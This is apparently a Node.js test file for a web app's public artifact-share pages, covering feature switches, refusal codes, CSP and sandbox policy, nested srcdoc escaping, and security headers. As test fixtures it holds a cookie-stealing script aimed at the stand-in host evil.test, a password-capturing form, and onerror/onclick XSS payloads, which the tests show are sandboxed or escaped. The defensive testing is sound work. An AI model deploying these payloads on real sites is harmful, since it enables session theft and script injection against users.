import assert from "node:assert/strict";
import test from "node:test";

import {
    ARTIFACT_SHARE_LANGUAGES,
    ARTIFACT_SHARE_PREVIEW_KINDS,
    answerContainsCode,
    artifactShareRefusal,
    artifactShareBlockPrefix,
    artifactShareSourceKey,
    artifactShareTtlDays,
    artifactSharingAvailable,
    artifactSharingEnabledFromValue,
    shareableCodeLanguage,
} from "../lib/artifactShareAccess.ts";
import {
    ARTIFACT_SHARE_FRAME_SANDBOX,
    ARTIFACT_SHARE_NOT_FOUND_CSP,
    artifactSharePageCsp,
    artifactSharePageHeaders,
    buildArtifactShareNotFoundPage,
    buildArtifactSharePage,
} from "../lib/artifactSharePage.ts";
import { ARTIFACT_SHARE_OVERRIDE_HEADERS, isArtifactSharePagePath } from "../lib/artifactSharePageHeaders.ts";
import { HTML_PREVIEW_MAX_BYTES, HTML_PREVIEW_OUTER_CSP, htmlPreviewCsp } from "../lib/htmlArtifactPreview.ts";
import { reactPreviewCsp } from "../lib/chatArtifactPreview.ts";

const ORIGIN = "https://tomverse.app";

/* ---------- the switch ---------- */

test("sharing is off by default and on only for the literal \"true\" with public sharing on", () => {
    assert.equal(artifactSharingAvailable({ storedFlagValue: undefined, publicSharingEnabled: true }), false);
    assert.equal(artifactSharingAvailable({ storedFlagValue: null, publicSharingEnabled: true }), false);
    for (const value of ["TRUE", "1", "yes", "on", " true", "true "]) {
        assert.equal(artifactSharingEnabledFromValue(value), false, value);
        assert.equal(artifactSharingAvailable({ storedFlagValue: value, publicSharingEnabled: true }), false, value);
    }
    assert.equal(artifactSharingAvailable({ storedFlagValue: "true", publicSharingEnabled: true }), true);
    // The maintenance switch for every public share wins.
    assert.equal(artifactSharingAvailable({ storedFlagValue: "true", publicSharingEnabled: false }), false);
});

/* ---------- what may be shared ---------- */

const OPEN = {
    sharingAvailable: true,
    planAllowsSharing: true,
    sourceFound: true,
    conversation: { isChatKind: true, temporary: false, locked: false, continuesImport: false },
    researchPrivate: false,
    contentBytes: 100,
};

test("a found, owned source in an ordinary chat may be shared", () => {
    assert.equal(artifactShareRefusal(OPEN), null);
});

test("each refusal has its own code, in the order a person can act on", () => {
    const cases = [
        [{ sharingAvailable: false }, "ARTIFACT_SHARING_DISABLED", 503],
        [{ planAllowsSharing: false }, "PLAN_FEATURE_NOT_INCLUDED", 403],
        [{ sourceFound: false }, "ARTIFACT_SHARE_SOURCE_NOT_FOUND", 404],
        [{ conversation: null }, "ARTIFACT_SHARE_SOURCE_NOT_FOUND", 404],
        [{ conversation: { ...OPEN.conversation, isChatKind: false } }, "CONVERSATION_KIND_NOT_SUPPORTED", 409],
        [{ conversation: { ...OPEN.conversation, temporary: true } }, "TEMPORARY_CHAT", 409],
        [{ conversation: { ...OPEN.conversation, locked: true } }, "CONVERSATION_LOCKED", 409],
        [{ conversation: { ...OPEN.conversation, continuesImport: true } }, "CONTINUATION_SHARE_NOT_SUPPORTED", 409],
        [{ researchPrivate: true }, "RESEARCH_SHARE_PRIVATE", 409],
        [{ contentBytes: 0 }, "ARTIFACT_SHARE_TOO_LARGE", 413],
        [{ contentBytes: HTML_PREVIEW_MAX_BYTES + 1 }, "ARTIFACT_SHARE_TOO_LARGE", 413],
        [{ contentBytes: Number.NaN }, "ARTIFACT_SHARE_TOO_LARGE", 413],
    ];
    for (const [overrides, code, status] of cases) {
        assert.deepEqual(artifactShareRefusal({ ...OPEN, ...overrides }), { code, status }, code);
    }
    // Exactly the preview's limit is allowed.
    assert.equal(artifactShareRefusal({ ...OPEN, contentBytes: HTML_PREVIEW_MAX_BYTES }), null);
    // The switch is checked before anything about the source.
    assert.equal(artifactShareRefusal({ ...OPEN, sharingAvailable: false, sourceFound: false }).code, "ARTIFACT_SHARING_DISABLED");
});

test("only html, svg, jsx and tsx blocks are shareable, as the kinds the preview runs", () => {
    assert.deepEqual(shareableCodeLanguage("HTML"), { previewKind: "html", language: "html" });
    assert.deepEqual(shareableCodeLanguage("htm"), { previewKind: "html", language: "htm" });
    assert.deepEqual(shareableCodeLanguage("svg"), { previewKind: "svg", language: "svg" });
    assert.deepEqual(shareableCodeLanguage("tsx"), { previewKind: "react", language: "tsx" });
    for (const language of ["js", "python", "css", "docx", "pptx", "", null, undefined]) {
        assert.equal(shareableCodeLanguage(language), null, String(language));
    }
    assert.deepEqual([...ARTIFACT_SHARE_PREVIEW_KINDS], ["html", "svg", "react"]);
    assert.deepEqual([...ARTIFACT_SHARE_LANGUAGES], ["html", "htm", "svg", "jsx", "tsx"]);
});

test("a code block must be text the stored answer contains", () => {
    const answer = "Here:\r\n\r\n```html\r\n<h1>Hi</h1>\r\n<p>x</p>\r\n```";
    assert.equal(answerContainsCode(answer, "<h1>Hi</h1>\n<p>x</p>"), true);
    assert.equal(answerContainsCode(answer, "<h1>Hi</h1>\n<form action=https://evil.test></form>"), false);
    assert.equal(answerContainsCode(answer, "   "), false);
});

test("one link per source and the conversation share's lifetime", () => {
    assert.equal(artifactShareSourceKey({ kind: "artifact", artifactId: "a1" }), "artifact:a1");
    const block = { kind: "code_block", messageId: "m1", blockIndex: 2, contentHash: "ff" };
    assert.equal(artifactShareSourceKey({ ...block, language: "html" }), "code:m1:2:html:ff");
    // The same text rendered as another language is another page and another link.
    assert.notEqual(artifactShareSourceKey({ ...block, language: "jsx" }), artifactShareSourceKey({ ...block, language: "html" }));
    assert.notEqual(artifactShareSourceKey({ ...block, language: "tsx" }), artifactShareSourceKey({ ...block, language: "jsx" }));
    // Every key at one block starts with that block's place, whatever the language or text.
    for (const language of ["html", "jsx"]) {
        assert.ok(artifactShareSourceKey({ ...block, language, contentHash: "00" }).startsWith(artifactShareBlockPrefix(block)));
    }
    assert.ok(!artifactShareSourceKey({ ...block, blockIndex: 12, language: "html" }).startsWith(artifactShareBlockPrefix(block)));
    assert.equal(artifactShareTtlDays({}), 30);
    assert.equal(artifactShareTtlDays({ SHARE_LINK_TTL_DAYS: "7" }), 7);
    assert.equal(artifactShareTtlDays({ SHARE_LINK_TTL_DAYS: "0" }), 30);
    assert.equal(artifactShareTtlDays({ SHARE_LINK_TTL_DAYS: "999" }), 30);
});

/* ---------- the public page ---------- */

const directives = (policy) =>
    new Map(policy.split(";").map((part) => part.trim()).filter(Boolean).map((part) => {
        const [name, ...sources] = part.split(/\s+/);
        return [name, sources];
    }));

test("the page's policy is the preview frame's policy plus sandbox and no framing, and admits nothing more", () => {
    const page = directives(artifactSharePageCsp(ORIGIN));
    const frame = directives(htmlPreviewCsp(ORIGIN));
    assert.deepEqual(page.get("sandbox"), ["allow-scripts"]);
    assert.deepEqual(page.get("frame-ancestors"), ["'none'"]);
    // Every fetch directive of the page is exactly the frame's: no source added anywhere.
    for (const [name, sources] of page) {
        if (name === "sandbox" || name === "frame-ancestors") continue;
        assert.deepEqual(sources, frame.get(name), name);
    }
    assert.equal(page.size, frame.size + 2);
    // The channels a page could send a visitor's input through are closed.
    assert.deepEqual(page.get("connect-src"), ["'none'"]);
    assert.deepEqual(page.get("form-action"), ["'none'"]);
    assert.deepEqual(page.get("frame-src"), ["'none'"]);
    assert.deepEqual(page.get("img-src"), ["data:", "blob:"]);
    assert.ok(!page.get("script-src").includes("'unsafe-eval'"));
    // Exactly the string the route sends.
    assert.equal(
        artifactSharePageCsp(ORIGIN),
        `sandbox allow-scripts; ${htmlPreviewCsp(ORIGIN)}; frame-ancestors 'none'`
    );
});

test("the frame sandbox is scripts only", () => {
    assert.equal(ARTIFACT_SHARE_FRAME_SANDBOX, "allow-scripts");
    for (const token of ["allow-same-origin", "allow-forms", "allow-popups", "allow-top-navigation", "allow-modals", "allow-downloads"]) {
        assert.ok(!artifactSharePageCsp(ORIGIN).includes(token), token);
    }
});

const COPY = {
    lang: "en",
    title: "Shared page",
    notice: "This content was made by a user, not by Tomverse. Don't enter passwords or payment details.",
    report: "Report",
    expires: "Link expires 28 Dec 2026",
    frameTitle: "Shared page content",
};
const LABELS = { errorTitle: "e", loadFailed: "l", noComponent: "n", missingPackage: "m {name}" };

const decode = (value) => value.replace(/&quot;/g, "\"").replace(/&#39;/g, "'").replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
const srcdocOf = (html) => decode(/srcdoc="([^"]*)"/.exec(html)[1]);

const hostile =
    "<script>top.location='https://evil.test/'+document.cookie</script>" +
    "<form action='https://evil.test'><input name=pw></form><a href=x onclick=alert(1)>x</a>";

test("the shared page's code is never part of our document: it is only inside the escaped srcdoc", () => {
    const html = buildArtifactSharePage({
        share: { previewKind: "html", language: "html", title: null, content: hostile },
        copy: COPY,
        labels: LABELS,
        assetOrigin: ORIGIN,
        reportUrl: `${ORIGIN}/support`,
    });
    // No markup of the page appears in the top document: no script, form or handler of any kind.
    assert.doesNotMatch(html, /<script|<form|<input/i);
    assert.doesNotMatch(html.replace(/srcdoc="[^"]*"/, ""), /onclick|evil\.test/i);
    assert.equal((html.match(/<iframe /g) ?? []).length, 1);
    assert.match(html, /<iframe [^>]*sandbox="allow-scripts"[^>]*>/);
    assert.match(html, /referrerpolicy="no-referrer"/);
    assert.doesNotMatch(html, /<iframe [^>]* src=/);
    // The notice is ours, outside and above the frame.
    assert.ok(html.indexOf(COPY.notice) < html.indexOf("<iframe"));
    assert.ok(html.includes(`href="${ORIGIN}/support"`));
    assert.match(html, /<meta name="robots" content="noindex, nofollow, noarchive">/);
    assert.match(html, /<meta name="referrer" content="no-referrer">/);

    // One level down: the preview's own outer document, frame-src 'none', and the same sandbox again.
    const outer = srcdocOf(html);
    assert.ok(outer.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_OUTER_CSP}">`));
    assert.match(outer, /<iframe sandbox="allow-scripts" referrerpolicy="no-referrer"/);
    // The page, with the preview's policy in front of it.
    const inner = srcdocOf(outer);
    assert.ok(inner.startsWith(`<!doctype html><meta http-equiv="Content-Security-Policy" content="${htmlPreviewCsp(ORIGIN)}">`));
    assert.ok(inner.endsWith(hostile));
});

test("a React share runs in the React preview document with its narrower policy and this origin's files", () => {
    const html = buildArtifactSharePage({
        share: { previewKind: "react", language: "tsx", title: null, content: "export default function App() { return <p>hi</p>; }" },
        copy: COPY,
        labels: LABELS,
        assetOrigin: ORIGIN,
        reportUrl: `${ORIGIN}/support`,
    });
    const inner = srcdocOf(srcdocOf(html));
    assert.ok(inner.includes(reactPreviewCsp(ORIGIN)));
    assert.ok(inner.includes(`${ORIGIN}/vendor/artifact-preview/react-18.3.1.production.min.js`));
    // Its scripts come from this origin only; the CDNs named in the shared frame policy are narrowed away by the React one.
    assert.doesNotMatch(inner, /<script src="https:\/\/(?:cdnjs|cdn\.jsdelivr|unpkg)/);
    assert.doesNotMatch(reactPreviewCsp(ORIGIN), /cdnjs|jsdelivr|unpkg/);
});

test("a file name is text, and a page over the limit or empty is not built", () => {
    const html = buildArtifactSharePage({
        share: { previewKind: "html", language: "html", title: "<img src=x onerror=alert(1)>.html", content: "<p>x</p>" },
        copy: COPY,
        labels: LABELS,
        assetOrigin: ORIGIN,
        reportUrl: `${ORIGIN}/support`,
    });
    assert.doesNotMatch(html.replace(/srcdoc="[^"]*"/, ""), /<img/);
    assert.ok(html.includes("&lt;img src=x onerror=alert(1)&gt;.html"));
    const build = (content) => buildArtifactSharePage({
        share: { previewKind: "html", language: "html", title: null, content },
        copy: COPY,
        labels: LABELS,
        assetOrigin: ORIGIN,
        reportUrl: `${ORIGIN}/support`,
    });
    assert.equal(build("x".repeat(HTML_PREVIEW_MAX_BYTES + 1)), null);
    assert.equal(build("  "), null);
    assert.ok(build("x".repeat(HTML_PREVIEW_MAX_BYTES)));
});

test("the page is sent uncached, unindexed, without a referrer, unframeable, with every powerful feature off", () => {
    const headers = artifactSharePageHeaders(artifactSharePageCsp(ORIGIN));
    assert.equal(headers["Content-Security-Policy"], artifactSharePageCsp(ORIGIN));
    assert.equal(headers["Content-Type"], "text/html; charset=utf-8");
    // The conversation share's cache policy.
    assert.equal(headers["Cache-Control"], "private, no-store, max-age=0");
    assert.equal(headers["CDN-Cache-Control"], "no-store");
    assert.equal(headers["Cloudflare-CDN-Cache-Control"], "no-store");
    assert.equal(headers["X-Robots-Tag"], "noindex, nofollow, noarchive");
    assert.equal(headers["Referrer-Policy"], "no-referrer");
    assert.equal(headers["X-Frame-Options"], "DENY");
    assert.equal(headers["X-Content-Type-Options"], "nosniff");
    assert.equal(headers["Cross-Origin-Opener-Policy"], "unsafe-none");
    for (const feature of ["camera", "microphone", "geolocation", "payment", "fullscreen", "clipboard-read"]) {
        assert.ok(headers["Permissions-Policy"].includes(`${feature}=()`), feature);
    }
    // next.config.ts applies the same overrides by path.
    for (const { key, value } of ARTIFACT_SHARE_OVERRIDE_HEADERS) assert.equal(headers[key], value, key);
});

test("the not-available page has no script and no frame at all", () => {
    const html = buildArtifactShareNotFoundPage({ lang: "ko", title: "t", notFoundTitle: "<b>x</b>", notFound: "y" });
    assert.doesNotMatch(html, /<script|<iframe|<b>/);
    assert.match(ARTIFACT_SHARE_NOT_FOUND_CSP, /^sandbox; default-src 'none';/);
    assert.doesNotMatch(ARTIFACT_SHARE_NOT_FOUND_CSP, /script-src/);
});

test("the share page path is its own and does not cover the conversation share", () => {
    assert.equal(isArtifactSharePagePath("/share/a/abc"), true);
    assert.equal(isArtifactSharePagePath("/share/abc"), false);
    assert.equal(isArtifactSharePagePath("/share/"), false);
});
